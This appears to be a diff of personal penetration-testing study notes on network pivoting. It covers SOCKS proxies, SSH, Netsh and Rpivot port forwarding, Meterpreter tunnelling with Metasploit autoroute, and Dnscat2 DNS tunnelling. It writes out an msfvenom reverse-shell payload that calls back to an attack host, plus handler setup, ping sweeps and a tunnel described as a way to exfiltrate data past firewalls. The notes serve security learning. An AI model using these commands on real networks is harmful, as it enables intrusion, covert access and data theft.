@@ -38,109 +38,13 @@ If we have a compromised host that has access to other networks, we can scan tha
 Like [[#SSH port forwarding to access closed ports]], we can utilise SSH for this dynamic port forwarding and pivoting. However, we also need to utilise a *SOCKS Listener* on our local machine then configure SSH to forward traffic to the network after connecting to the target host (*This is SSH tunneling over SOCKS proxy*).
 
 #### SOCKS
-Socket Secure (*SOCKS*) is a protocol for communicating with servers when firewall restrictions are present. Most protocols initiate a connection to connect to a service, SOCKS instead generates traffic from a client, which then connects to the SOCKS server controlled by the user who wants to access a service on the client-side. This is very useful for circumventing restrictions from firewalls, allowing external entities to bypass the firewall and access protected services. SOCKS proxy can create a route to an external server from NAT networks.
+Socket Secure (*[SOCKS](https://en.wikipedia.org/wiki/SOCKS)*) is a protocol for communicating with servers when firewall restrictions are present. Most protocols initiate a connection to connect to a service, SOCKS instead generates traffic from a client, which then connects to the SOCKS server controlled by the user who wants to access a service on the client-side. This is very useful for circumventing restrictions from firewalls, allowing external entities to bypass the firewall and access protected services. SOCKS proxy can create a route to an external server from NAT networks.
 
 *SOCKS4* doesn't support UDP or authentication, *SOCKS5* does.
 > [[#SSH dynamic port forwarding with SOCKS]]
 
-## Tunnelling
-Tunnelling is when we *encapsulate traffic in another protocol and route traffic through it*. VPNs are an example of tunnelling. This is particularly useful for evading detection systems where we need to discretely pass traffic in/out of a network (eg. using HTTPS to mask our C2 traffic). 
-### Tunnelling with Meterpreter
-1. We need to first create a payload for the pivot host (*this example creates a reverse tcp meterpreter shell which will connect back to port 8080 on our machine*)
-```bash
-$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<attack_host_IP> -f elf -o backup LPORT=8080
-```
-2. Next we need to setup a *Generic Payload Handler* (`multi/handler`)
-```bash
-msf6 > use exploit/multi/handler
-> set payload linux/x64/meterpreter/reverse_tcp
-> set lhost 0.0.0.0
-> set lport 8080
-> run
-
-[*] Started reverse TCP handler on 0.0.0.0:8080
-```
-3. We can then copy the payload over to the pivot host and execute it, this will form the meterpreter reverse connection back to our handler
-4. From here we can use modules like `post/multi/gather/ping_sweep` or bash to search for targets on the internal networks etc (*remember windows blocks ICMP requests normally*)
-```bash
-for i in {1..254} ;do (ping -c 1 x.x.x.$i | grep "bytes from" &) ;done
-```
-```batch
-for /L %i in (1 1 254) do ping x.x.x.%i -n 1 -w 100 | find "Reply"
-```
-```PowerShell
-1..254 | % {"x.x.x.$($_): $(Test-Connection -count 1 -comp x.x.x.$($_) -quiet)"}
-```
-> It is often worth performing these checks at least twice as sometimes the system will need time to build its arp cache. This could mean that some systems may not result in a successful reply on the first attempt.
-
-If a host's firewall blocks ICMP requests (pings) then we will have to use nmap's TCP scan instead.
-### Socks proxy with Metasploit
-1. We can use the `socks_proxy` module in [[Metasploit]] to configure a local SOCKS proxy on our attack machine.
-```bash
-msf6 > use auxiliary/server/socks_proxy
-
-# makes the proxy listen on 0.0.0.0:9050
-> set SRVPORT 9050
-> set SRVHOST 0.0.0.0
-# Use SOCKS version 4a
-> set version 4a
-> run
-
-# Confirm proxy server is running
-> jobs
-```
-2. We can then configure [[Proxychains]] to do the routing for our tools
-![[Proxychains#Configuration]]
-3. We need to make the `socks_proxy` route all the traffic via our existing [[#Tunnelling with Meterpreter|Meterpreter session]] with `autoroute`
-```bash
-msf6 > use post/multi/manage/autoroute
-
-> set SESSION 1
-> set SUBNET <our_target_internal_subnet>
-> run
-```
-> this is possible to do directly in the meterpreter session with `run autoroute -s <subnet>` but it is deprecated.
-> We can see all the routes in the meterpreter session with `run autoroute -p` or setting the `CMD` option to `print` in the `autoroute` module
-
-4. Finally, we can run our tool (`nmap`) through [[Proxychains]] which will route through our [[#Tunnelling with Meterpreter|Meterpreter session]].
-```bash
-$ proxychains nmap -sn -v <target_internal_subnet>
-```
-![[meterpreter-socks-proxy.drawio.png]]
-
-### Web Server Pivoting with Rpivot
-[Rpivot](https://github.com/klsecservices/rpivot) us a reverse SOCKS proxy written in python, for SOCKS tunnelling. It allows us to bind a machine inside an internal network to an external server and exposes the client's local port on the server-side. This lets us access internal web servers from the outside.
-![[rpivot-webserver.webp]]
-1. [Rpivot](https://github.com/klsecservices/rpivot) requires python 2.7, so we might need to also install it (*we also require it on both the attack host and pivot host*)
-```bash
-git clone https://github.com/klsecservices/rpivot.git
-sudo apt-get install python2.7
-```
-2. We can then connect to our pivot host
-```bash
-python2.7 server.py --proxy-port <port_to_use_for_proxy> --server-port <port_to_connect_to_server> --server-ip 0.0.0.0
-```
-3. Transfer the [Rpivot](https://github.com/klsecservices/rpivot) files over to the pivot host (*should be easy to do with `scp`*) and then run `client.py` to connect to our server
-```bash
-scp -r rpivot <user>@<pivot_host>:~/
-
-# Now on the pivot host
-python2.7 client.py --server-ip <our_server_ip/attack_box_ip> --server-port <server_port>
-```
-> Some enterprise networks will use a Domain controlled [HTTP-proxy with NTLM authentication](https://learn.microsoft.com/en-us/openspecs/office_protocols/ms-grvhenc/b9e676e7-e787-4020-9840-7cfe7c76044a). This will prevent us directly pivoting to our external server and will require us to authenticate with NTLM first.
-> `python2.7 client.py --server-ip <our_server_ip/attack_box_ip> --server-port <server_port> --ntlm-proxy-ip <ip_of_proxy> --ntlm-proxy-port <port> --domain <windows_domain_name> --username <user> --password <pass>`
-4. Configure [[Proxychains]]
-![[Proxychains#Configuration]]
-5. Use [[Proxychains]] to query the webpage
-```bash
-proxychains curl -v <internal_ip_of_webserver>:<port>
-
-# May timeout
-proxychains firefox-esr <internal_ip_of_webserver>:<port>
-```
-
-## Port Forwarding
-Port forwarding is *redirecting a communication request from one port to another*. TCP is used as the primary communication layer but application layer protocols like SSH or even [SOCKS](https://en.wikipedia.org/wiki/SOCKS) (non-application layer) can be used to encapsulate the forwarded traffic. Port forwarding can be a useful technique for bypassing firewalls and using existing services on the compromised host to pivot to other networks.
+#### Port Forwarding
+Port forwarding is *redirecting a communication request from one port to another*. TCP is used as the primary communication layer but application layer protocols like SSH or even [[#SOCKS]] (non-application layer) can be used to encapsulate the forwarded traffic. Port forwarding can be a useful technique for bypassing firewalls and using existing services on the compromised host to pivot to other networks.
 
 ### SSH port forwarding to access closed ports
 ![[port-forwarding.drawio.png]]
@@ -332,3 +236,118 @@ plink -ssh -D <local_port> <user>@<pivot_host>
 We can then use [Proxifier](https://www.proxifier.com/) to create a SOCKS tunnel over the SSH session. It allows you to create a SOCKS or HTTPS proxy (and proxy chains) for desktop client applications. [Proxifier](https://www.proxifier.com/) is a GUI application, within it we can create a SOCKS server for `127.0.0.1` on the port we used for SSH.
 
 We can then start `mstsc.exe` with our windows target IP to proxy the RDP connection.
+
+### Port forwarding with Windows Netsh
+[Netsh](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts) is a Windows CLI tool for performing network configuration on a Windows system. It can be used for *Finding routes*, *Viewing the firewall configuration*, *Adding proxies*, and *Creating port forwarding rules*.
+We can forward all data received on a particular port to another machine using:
+```batch
+netsh.exe interface portproxy add v4tov4 listenport=<pivot_host_port_to_listen> listenaddress=<pivot_host_ip> connectport=<remote_port> connectaddress=<remote_ip>
+```
+
+Verify the configuration with:
+```batch
+netsh.exe interface portproxy show v4tov4
+```
+
+We can then connect to the `listenport` on the pivot host from our attack machine and the traffic will be routed through to our target.
+
+### Web Server Pivoting with Rpivot
+[Rpivot](https://github.com/klsecservices/rpivot) us a reverse SOCKS proxy written in python, for SOCKS tunnelling. It allows us to bind a machine inside an internal network to an external server and exposes the client's local port on the server-side. This lets us access internal web servers from the outside.
+![[rpivot-webserver.webp]]
+1. [Rpivot](https://github.com/klsecservices/rpivot) requires python 2.7, so we might need to also install it (*we also require it on both the attack host and pivot host*)
+```bash
+git clone https://github.com/klsecservices/rpivot.git
+sudo apt-get install python2.7
+```
+2. We can then connect to our pivot host
+```bash
+python2.7 server.py --proxy-port <port_to_use_for_proxy> --server-port <port_to_connect_to_server> --server-ip 0.0.0.0
+```
+3. Transfer the [Rpivot](https://github.com/klsecservices/rpivot) files over to the pivot host (*should be easy to do with `scp`*) and then run `client.py` to connect to our server
+```bash
+scp -r rpivot <user>@<pivot_host>:~/
+
+# Now on the pivot host
+python2.7 client.py --server-ip <our_server_ip/attack_box_ip> --server-port <server_port>
+```
+> Some enterprise networks will use a Domain controlled [HTTP-proxy with NTLM authentication](https://learn.microsoft.com/en-us/openspecs/office_protocols/ms-grvhenc/b9e676e7-e787-4020-9840-7cfe7c76044a). This will prevent us directly pivoting to our external server and will require us to authenticate with NTLM first.
+> `python2.7 client.py --server-ip <our_server_ip/attack_box_ip> --server-port <server_port> --ntlm-proxy-ip <ip_of_proxy> --ntlm-proxy-port <port> --domain <windows_domain_name> --username <user> --password <pass>`
+4. Configure [[Proxychains]]
+![[Proxychains#Configuration]]
+5. Use [[Proxychains]] to query the webpage
+```bash
+proxychains curl -v <internal_ip_of_webserver>:<port>
+
+# May timeout
+proxychains firefox-esr <internal_ip_of_webserver>:<port>
+```
+
+## Tunnelling
+Tunnelling is when we *encapsulate traffic in another protocol and route traffic through it*. VPNs are an example of tunnelling. This is particularly useful for evading detection systems where we need to discretely pass traffic in/out of a network (eg. using HTTPS to mask our C2 traffic). 
+### Tunnelling with Meterpreter
+1. We need to first create a payload for the pivot host (*this example creates a reverse tcp meterpreter shell which will connect back to port 8080 on our machine*)
+```bash
+$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<attack_host_IP> -f elf -o backup LPORT=8080
+```
+2. Next we need to setup a *Generic Payload Handler* (`multi/handler`)
+```bash
+msf6 > use exploit/multi/handler
+> set payload linux/x64/meterpreter/reverse_tcp
+> set lhost 0.0.0.0
+> set lport 8080
+> run
+
+[*] Started reverse TCP handler on 0.0.0.0:8080
+```
+3. We can then copy the payload over to the pivot host and execute it, this will form the meterpreter reverse connection back to our handler
+4. From here we can use modules like `post/multi/gather/ping_sweep` or bash to search for targets on the internal networks etc (*remember windows blocks ICMP requests normally*)
+```bash
+for i in {1..254} ;do (ping -c 1 x.x.x.$i | grep "bytes from" &) ;done
+```
+```batch
+for /L %i in (1 1 254) do ping x.x.x.%i -n 1 -w 100 | find "Reply"
+```
+```PowerShell
+1..254 | % {"x.x.x.$($_): $(Test-Connection -count 1 -comp x.x.x.$($_) -quiet)"}
+```
+> It is often worth performing these checks at least twice as sometimes the system will need time to build its arp cache. This could mean that some systems may not result in a successful reply on the first attempt.
+
+If a host's firewall blocks ICMP requests (pings) then we will have to use nmap's TCP scan instead.
+### Socks proxy with Metasploit
+1. We can use the `socks_proxy` module in [[Metasploit]] to configure a local SOCKS proxy on our attack machine.
+```bash
+msf6 > use auxiliary/server/socks_proxy
+
+# makes the proxy listen on 0.0.0.0:9050
+> set SRVPORT 9050
+> set SRVHOST 0.0.0.0
+# Use SOCKS version 4a
+> set version 4a
+> run
+
+# Confirm proxy server is running
+> jobs
+```
+2. We can then configure [[Proxychains]] to do the routing for our tools
+![[Proxychains#Configuration]]
+3. We need to make the `socks_proxy` route all the traffic via our existing [[#Tunnelling with Meterpreter|Meterpreter session]] with `autoroute`
+```bash
+msf6 > use post/multi/manage/autoroute
+
+> set SESSION 1
+> set SUBNET <our_target_internal_subnet>
+> run
+```
+> this is possible to do directly in the meterpreter session with `run autoroute -s <subnet>` but it is deprecated.
+> We can see all the routes in the meterpreter session with `run autoroute -p` or setting the `CMD` option to `print` in the `autoroute` module
+
+4. Finally, we can run our tool (`nmap`) through [[Proxychains]] which will route through our [[#Tunnelling with Meterpreter|Meterpreter session]].
+```bash
+$ proxychains nmap -sn -v <target_internal_subnet>
+```
+![[meterpreter-socks-proxy.drawio.png]]
+
+### DNS Tunnelling with Dnscat2
+[Dnscat2](https://github.com/iagox86/dnscat2) is a tunnelling tool that uses the [[DNS]] protocol to encapsulate the traffic. It uses an encrypted *command & control* (*C2*) channel to send data inside TXT records. Pretty much any [[Active Directory]] domain will its own DNS server that will rout traffic to external DNS servers participating in the internet's DNS system. However, with `dnscat2`, the address resolution is requested from an external server. This means that when a local DNS within the network tries to resolve an address, data is exfiltrated and sent in place of legitimate DNS requests.
+
+*This is a really stealthy approach to exfiltrate data while evading firewall detections which sniff the traffic and strip the HTTPS connections*.
